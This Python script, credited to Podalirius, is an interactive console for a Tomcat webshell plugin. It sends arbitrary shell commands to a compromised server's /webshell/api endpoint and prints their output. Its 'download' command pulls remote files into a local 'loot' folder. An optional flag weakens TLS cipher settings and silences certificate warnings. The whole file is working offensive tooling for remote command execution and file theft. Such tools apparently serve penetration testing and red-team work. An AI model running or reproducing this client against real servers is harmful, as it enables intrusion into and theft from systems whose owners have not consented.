#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : console.py
# Author             : Podalirius (@podalirius_)
# Date created       : 15 May 2022


import argparse
import os
import readline
import requests
import json


class CommandCompleter(object):
    def __init__(self):
        self.options = {
            "help": [],
            "download": [],
            "exit": []
        }

    def complete(self, text, state):
        if state == 0:
            if len(text) == 0:
                self.matches = [s for s in self.options.keys()]
            elif len(text) != 0:
                self.matches = [s for s in self.options.keys() if s and s.startswith(text)]
        try:
            return self.matches[state] + " "
        except IndexError:
            return None


readline.set_completer(CommandCompleter().complete)
readline.parse_and_bind('tab: complete')
readline.set_completer_delims('\n')


def parseArgs():
    print("[+] CLI console for Apache tomcat webshell - by @podalirius_")
    print("[+] src: https://github.com/p0dalirius/Tomcat-plugin-webshell\n")

    parser = argparse.ArgumentParser(description="Interactive console for Apache Tomcat webshell plugin")
    parser.add_argument("-t", "--target", default=None, required=True, help='Apache Tomcat target instance')
    parser.add_argument("-k", "--insecure", dest="insecure_tls", action="store_true", default=False, help="Allow insecure server connections when using SSL (default: False)")
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help='Verbose mode. (default: False)')
    return parser.parse_args()


def remote_exec(target, cmd, verbose=False):
    try:
        r = requests.post(
            "%s/webshell/api" % target,
            data={
                "action": "exec",
                "cmd": cmd,
            }
        )
        if r.status_code == 200:
            data = r.json()
            if verbose:
                print(json.dumps(data, indent=4))
            if len(data["stdout"].strip()) != 0:
                print(data["stdout"].strip())

            if len(data["stderr"].strip()) != 0:
                for line in data["stderr"].strip().split('\n'):
                    print("\x1b[91m%s\x1b[0m" % line)
    except Exception as e:
        print(e)


def remote_download(target, remote_path, local_path="./loot/", verbose=False):
    def b_filesize(content):
        l = len(content)
        units = ['B', 'kB', 'MB', 'GB', 'TB', 'PB']
        for k in range(len(units)):
            if l < (1024 ** (k + 1)):
                break
        return "%4.2f %s" % (round(l / (1024 ** (k)), 2), units[k])

    #
    r = requests.post(
        "%s/webshell/api" % target,
        data={
            "action": "download",
            "path": remote_path,
        }
    )

    if r.status_code == 200:
        if "application/json" in r.headers["Content-Type"]:
            data = r.json()
            print('\x1b[91m[!] (%s) %s\x1b[0m' % ("==error==", data["error"]))
            return False
        else:
            print('\x1b[92m[+] (%9s) %s\x1b[0m' % (b_filesize(r.content), remote_path))
            dir = local_path + os.path.dirname(remote_path)
            if not os.path.exists(dir):
                os.makedirs(dir, exist_ok=True)
            f = open(local_path + remote_path, "wb")
            f.write(r.content)
            f.close()
            return True
    else:
        print('\x1b[91m[!] (%s) %s\x1b[0m' % ("==error==", remote_path))
        return False


def show_help():
    print(" - %-15s %s " % ("download", "Downloads a file from the remote server."))
    print(" - %-15s %s " % ("help", "Displays this help message."))
    print(" - %-15s %s " % ("exit", "Exits the script."))
    return


if __name__ == '__main__':
    options = parseArgs()

    if not options.target.startswith("https://") and not options.target.startswith("http://"):
        options.target = "http://" + options.target

    if options.insecure_tls:
        # Disable warings of insecure connection for invalid certificates
        requests.packages.urllib3.disable_warnings()
        # Allow use of deprecated and weak cipher methods
        requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
        try:
            requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
        except AttributeError:
            pass

    running = True
    while running:
        cmd = input("[webshell]> ").strip()
        args = cmd.lower().split(" ")

        if args[0] == "exit":
            running = False
        elif args[0] == "help":
            show_help()
        elif args[0] == "download":
            if len(args) != 2 and len(args) != 3:
                print("Usage: download <remotepath> [localpath]")
            elif len(args) == 2:
                remote_download(options.target, remote_path=args[1])
            elif len(args) == 3:
                remote_download(options.target, remote_path=args[1], local_path=args[2])
        else:
            remote_exec(options.target, cmd, verbose=options.verbose)
